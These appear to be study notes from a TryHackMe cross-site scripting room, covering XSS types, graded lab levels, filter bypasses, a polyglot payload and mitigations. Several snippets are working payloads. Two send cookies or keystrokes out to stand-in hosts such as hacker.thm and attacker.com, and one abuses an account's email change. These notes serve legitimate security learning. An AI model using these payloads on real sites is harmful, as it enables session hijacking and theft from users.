Cross-Site Scriptinng is an injection attack where malicious JavaScript gets injected into a webapp and gets executed.

## XSS Payloads
A payload is the JavaScript code executed on the victim’s browser. Every payload consists of two elements:
- **Intention** – What the payload should do (e.g., alert box, cookie theft)
- **Modification** – Adjustments to ensure execution in different contexts
### Common Payload Intentions
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 
#### Proof of Concept

```html
<script>alert('XSS');</script>
```

#### Session Stealing

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

#### Keylogger

```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>
```

#### Business Logic Abuse

```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```

## Types of XSS

### Reflected XSS
- Occurs when user input in a request is reflected in the response without validation.
- Example: `?error=<script>alert('XSS')</script>`

**Testing:**  
Check reflection points in:
- URL query parameters
- File paths
- (Sometimes) HTTP headers

**Impact:**  
Attackers can craft malicious links that, when clicked by victims, execute arbitrary scripts.

---
### Stored XSS
- Payload is stored on the web application (e.g., in a database) and later executed for other users.
- Common locations: blog comments, profile fields, product listings

**Example:**

```html
<script>alert('XSS')</script>
```

**Impact:**  
Malicious code executes every time users view the affected content.

**Testing Tips:**
- Bypass frontend-only restrictions (e.g., change a dropdown field value to a script via manual request)    

---
### DOM-Based XSS

- Vulnerability exists in client-side JavaScript, not backend.
- Triggered via DOM manipulation using attacker-controlled input.

**Example:**

```js
document.getElementById("output").innerHTML = window.location.hash;
```

Payload: `https://site/#<script>alert(1)</script>`

**Impact:**  
Can lead to content injection, redirection, session theft.

**Testing:**
- Look for unsanitized use of:
    - `window.location`
    - `document.referrer`
    - `document.write()`
    - `eval()`        

---
### Blind XSS
- Like stored XSS, but the attacker cannot see the result directly.
- Payload is triggered in a different context (e.g., admin portal, staff ticket viewer).

**Example:**  
Support form accepts input:

```html
<script>fetch('https://attacker.com?c=' + document.cookie);</script>
```

**Impact:**  
Leaks sensitive staff session data or portal content.

## Practical Levels – Executing `alert('THM')`

### Level 1 – Reflected in raw HTML

Payload:

```html
<script>alert('THM');</script>
```

### Level 2 – Reflected in input `value=""` attribute

Payload:

```html
"><script>alert('THM');</script>
```

### Level 3 – Reflected in `<textarea>`

Payload:

```html
</textarea><script>alert('THM');</script>
```

### Level 4 – Injected inside a JavaScript block

Payload:

```js
';alert('THM');// 
```

### Level 5 – Filter removes the word `script`

Bypass filter with:

```html
<sscriptcript>alert('THM');</sscriptcript>
```

After filter → becomes:

```html
<script>alert('THM');</script>
```

### Level 6 – Reflected in an `img` tag, angle brackets filtered

Bypass with:

```html
/images/cat.jpg" onload="alert('THM');
```

## XSS Polyglot

An XSS polyglot can bypass filters, escape contexts, and trigger execution across many different scenarios.

Polyglot Payload:

```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

---

## Mitigation Strategies

- Escape special HTML characters (`<`, `>`, `"`, `'`, `&`)
    
- Apply strict **Content-Security-Policy (CSP)**
    
- Sanitize and validate all user input on the **server-side**
    
- Avoid using `innerHTML`, `eval()`, or `document.write()` with untrusted data
    
- Use frameworks that automatically prevent XSS (e.g., React, Angular)
    




# Reflected XSS
this type of XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected

# Stored XSS
this type happens when the XSS payload is stored in the web application (commonly its database) in the way that it then runs on every users that tries to access or interact with the site or web page where it is triggered.
